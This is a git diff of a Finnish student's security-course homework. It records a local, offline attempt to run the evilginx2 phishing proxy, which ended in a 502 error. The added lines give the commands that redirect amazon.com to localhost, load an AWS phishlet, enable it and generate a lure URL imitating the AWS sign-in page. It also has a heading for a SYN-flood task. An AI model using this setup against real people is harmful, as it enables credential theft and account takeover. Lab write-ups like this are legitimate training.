@@ -37,15 +37,43 @@ evilginx
 
 Huomasin kokeilemalla, että **`help`** komennolla saa asetusvalikon esille ja pääsee suoraan muuttamaan asetuksia. Otin varmuuden vuoksi virtuaalikoneen irti verkosta, että mitään luvatonta ei vahingossa tapahdu.
 
-Katsoin täältä [https://marcinmitruk.link/posts/evilginx-phishing-commands-tutorial/](https://marcinmitruk.link/posts/evilginx-phishing-commands-tutorial/) ohjeita miten tuota ohjelmaa voisi käyttää. Ilmeisesti pitäisi asettaa domain. Ohjelma ei hyväksy **`localhost:xxxx`**, **`127.0.0.x`** paikallisia domaineja. En laita julkista domainia ohjelmaan.
+Katsoin täältä [https://marcinmitruk.link/posts/evilginx-phishing-commands-tutorial/](https://marcinmitruk.link/posts/evilginx-phishing-commands-tutorial/) ohjeita miten tuota ohjelmaa voisi käyttää. Ilmeisesti pitäisi asettaa domain. Ohjelma ei hyväksy **`localhost:xxxx`** domainiksi, eikä **`127.0.0.1`** loopback ip osoitetta. En laita julkista domainia tai ip:tä ohjelmaan.
 
+[https://www.youtube.com/watch?v=z5gLXmXIyH8](https://www.youtube.com/watch?v=z5gLXmXIyH8) tämän videon ohjeilla lähdin toteuttamaan paikallista kokeilua:
 
+```bash
+cd /usr/share/evilginx2/phishlets
+sudo nano /etc/hosts
+#lisäsin tämän rivin: "127.0.0.1  example.com"
+```
+
+Ohjeen mukaan kävin hakemassa phishletin täältä [https://github.com/webdevvx/evilginx-phishlets/blob/main/aws.yaml](https://github.com/webdevvx/evilginx-phishlets/blob/main/aws.yaml), kopioin sisällön tekstitiedostoon:
+
+```bash
+pwd
+/usr/share/evilginx2/phishlets
+sudo nano aws.yaml #tänne sisältö
+sudo nano /etc/hosts #tänne lisään vielä "signin.aws" ja muutan example.com:n amazon.com:ksi
+sudo evilginx2 --developer
+config domain amazon.com
+config ipv4 127.0.0.1
+phishlets hostname aws amazon.com
+phishlets enable aws
+lures create aws
+#[08:22:36] [inf] created lure with ID: 0
+lures get-url 0 #koska annettu ID oli 0
+#https://signin.aws.amazon.com/LWAfYmia
+```
+
+Navigoin Firefoxilla tuohon "https://signin.aws.amazon.com/LWAfYmia" osoitteeseen.
 
 ### - Onnistuitko huijaamaan liikennettä
 
+En onnistunut huijaamaan liikennettä näillä ohjeilla. Navigoidessani tuohon edellisen kohdan osoitteeseen, jätin evilginxin päälle. Hetken päästä ruudulle ilmestyi pitkä pätkä seuraavaa:
 
+![502](kuvat/502.png)
 
-
+Eli johonkin asti pääsin tämän kanssa, mutta ei ihan maaliin.
 
 ### b) Sinulla on käytössäsi mininet-ympäristö. Luo ympäristö, jossa voit tehdä TCP SYN-Flood hyökkäyksen.
 ### - Kirjoita miten loit mininet ympäristön ja miten toteutit hyökkäyksen.
@@ -72,6 +100,9 @@ Katsoin täältä [https://marcinmitruk.link/posts/evilginx-phishing-commands-tu
 
 [https://marcinmitruk.link/posts/evilginx-phishing-commands-tutorial/](https://marcinmitruk.link/posts/evilginx-phishing-commands-tutorial/)
 
+[https://www.youtube.com/watch?v=z5gLXmXIyH8](https://www.youtube.com/watch?v=z5gLXmXIyH8)
+
+[https://github.com/webdevvx/evilginx-phishlets/blob/main/aws.yaml](https://github.com/webdevvx/evilginx-phishlets/blob/main/aws.yaml)
 
 ---
 
